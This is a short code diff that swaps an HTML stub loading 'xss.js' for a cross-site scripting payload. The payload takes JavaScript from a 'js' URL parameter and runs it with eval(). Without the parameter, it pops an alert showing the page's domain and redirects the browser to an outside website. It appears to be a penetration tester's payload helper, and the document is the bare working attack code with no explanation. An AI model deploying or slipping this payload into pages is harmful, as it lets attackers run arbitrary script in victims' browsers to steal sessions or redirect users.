@@ -1,1 +1,1 @@
-<html><script src=xss.js></script></html>
+function getParameterByName(name) { name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]"); var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"), results = regex.exec(location.search); return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " ")); } var js = getParameterByName('js'); if (js == "") { alert(document.domain); document.location="https://www.adamlogue.com"; } else { eval(js); }
